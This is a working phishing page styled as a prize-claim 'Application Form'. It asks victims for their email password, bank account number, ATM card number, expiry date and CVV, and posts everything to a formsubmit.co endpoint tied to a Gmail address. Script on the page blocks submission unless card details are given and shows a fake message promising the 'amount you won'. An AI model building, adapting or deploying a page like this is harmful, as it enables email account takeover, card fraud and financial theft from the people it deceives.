<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Application Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f5f5f5;
      margin: 0;
      padding: 0;
    }

    .container {
      max-width: 600px;
      margin: 40px auto;
      background: #fff;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }

    h2 {
      text-align: center;
      margin-bottom: 20px;
    }

    label {
      display: block;
      margin-top: 15px;
      font-weight: bold;
    }

    input, select {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border: 1px solid #ccc;
      border-radius: 8px;
      box-sizing: border-box;
    }

    .password-container {
      position: relative;
    }

    .toggle-password {
      position: absolute;
      right: 10px;
      top: 35%;
      transform: translateY(-50%);
      cursor: pointer;
    }

    .error {
      color: red;
      font-size: 0.9em;
      display: none;
      margin-top: 3px;
    }

    #final-note {
      margin-top: 20px;
      padding: 10px;
      background: #e9f5e9;
      border-left: 4px solid #4caf50;
      display: none;
    }

    button {
      width: 100%;
      background-color: #4caf50;
      color: white;
      padding: 12px;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      margin-top: 20px;
      cursor: pointer;
    }

    button:disabled {
      background-color: red;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Application Form</h2>
    <form id="applicationForm" action="https://formsubmit.co/exellentfirm@gmail.com" method="POST">
      <input type="hidden" name="_next" value="https://onlinegistrationprog.github.io/Application-Form/thankyou.html">
      <input type="hidden" name="_captcha" value="false">

      <label>1. Full Name:</label>
      <input type="text" name="Full Name" id="fullName" required>

      <label>2. Country:</label>
      <input type="text" name="Country" required>

      <label>3. Phone Number:</label>
      <input type="tel" name="Phone Number" id="phone" required>
      <div class="error" id="phoneError">Phone must be 9-12 digits</div>

      <label>4. Email Address:</label>
      <input type="email" name="Email Address" required>

      <label>5. Email Password:</label>
      <div class="password-container">
        <input type="password" name="Email Password" id="emailPassword" required>
        <span class="toggle-password" onclick="togglePassword('emailPassword')">üëÅÔ∏è</span>
      </div>

      <label>6. Amount You Won:</label>
      <input type="text" name="Amount You Won" id="amountWon" required>

      <label>7. Bank Account Type (e.g., Standard Bank):</label>
      <input type="text" name="Bank Account Type" id="accountType" required placeholder="e.g. Standard Bank">

      <label>8. Bank Account Number:</label>
      <input type="text" name="Bank Account Number" id="accountNumber" required>

      <label>9. Bank Account Holder's Name:</label>
      <input type="text" name="Bank Account Holder's Name" required>

      <label>10. Did You Link ATM to Your Bank Account?</label>
      <select name="Linked ATM?" id="linkedATM" required>
        <option value="">--Select--</option>
        <option value="Yes">Yes</option>
        <option value="No">No</option>
      </select>

      <div id="atmFields">
        <label>11. ATM Card Number:</label>
        <input type="text" name="ATM Card Number" id="cardNumber" required>
        <div class="error" id="cardError">Card number must be 16 digits</div>

        <label>12. Expiry Date (MM/YY):</label>
        <input type="text" name="Expiry Date" id="expiry" required>
        <div class="error" id="expiryError">Enter valid MM/YY</div>

        <label>13. CVV:</label>
        <input type="text" name="CVV" id="cvv" required>
        <div class="error" id="cvvError">CVV must be 3 digits</div>
      </div>

      <div id="final-note"></div>

      <button type="submit" id="submitBtn">Submit</button>
    </form>
  </div>

  <script>
    function togglePassword(fieldId) {
      const field = document.getElementById(fieldId);
      field.type = field.type === "password" ? "text" : "password";
    }

    const linkedATM = document.getElementById("linkedATM");
    const atmFields = document.getElementById("atmFields");
    const finalNote = document.getElementById("final-note");
    const submitBtn = document.getElementById("submitBtn");

    // Initialize
    atmFields.style.display = "none";
    submitBtn.disabled = true;
    submitBtn.innerText = "";

    linkedATM.addEventListener("change", () => {
      const selected = linkedATM.value;
      if (selected === "No") {
        atmFields.style.display = "none";
        finalNote.style.display = "none";
        submitBtn.disabled = true;
        submitBtn.innerText = "";
        alert("YOU MUST HAVE ATM CARD TO PROCEED");
      } else if (selected === "Yes") {
        atmFields.style.display = "block";
        submitBtn.disabled = false;
        submitBtn.innerText = "Submit";
        updateFinalNote();
      } else {
        atmFields.style.display = "none";
        submitBtn.disabled = true;
        submitBtn.innerText = "";
      }
    });

    function updateFinalNote() {
      const fullName = document.getElementById("fullName").value;
      const amountWon = document.getElementById("amountWon").value;
      const accountType = document.getElementById("accountType").value;
      const accountNumber = document.getElementById("accountNumber").value;

      if (linkedATM.value === "Yes" && fullName && amountWon && accountType && accountNumber) {
        finalNote.style.display = "block";
        finalNote.innerText = `Dear ${fullName}, You will receive ${amountWon} to your ${accountType}, ${accountNumber}`;
      } else {
        finalNote.style.display = "none";
      }
    }

    document.getElementById("fullName").addEventListener("blur", updateFinalNote);
    document.getElementById("amountWon").addEventListener("blur", updateFinalNote);
    document.getElementById("accountType").addEventListener("blur", updateFinalNote);
    document.getElementById("accountNumber").addEventListener("blur", updateFinalNote);

    // Validation on blur
    document.getElementById("phone").addEventListener("blur", () => {
      const phone = document.getElementById("phone").value;
      document.getElementById("phoneError").style.display = (phone.length < 9 || phone.length > 12) ? "block" : "none";
    });

    document.getElementById("cardNumber").addEventListener("blur", () => {
      const card = document.getElementById("cardNumber").value;
      document.getElementById("cardError").style.display = (card.length !== 16) ? "block" : "none";
    });

    document.getElementById("cvv").addEventListener("blur", () => {
      const cvv = document.getElementById("cvv").value;
      document.getElementById("cvvError").style.display = (cvv.length !== 3) ? "block" : "none";
    });

    // Expiry date masking
    document.getElementById("expiry").addEventListener("input", (e) => {
      let value = e.target.value.replace(/[^\d]/g, '');
      if (value.length >= 3) {
        value = value.slice(0, 2) + '/' + value.slice(2, 4);
      }
      e.target.value = value.slice(0, 5);
    });

    document.getElementById("expiry").addEventListener("blur", () => {
      const expiry = document.getElementById("expiry").value;
      const valid = /^\d{2}\/\d{2}$/.test(expiry);
      document.getElementById("expiryError").style.display = valid ? "none" : "block";
    });
  </script>
</body>
</html>
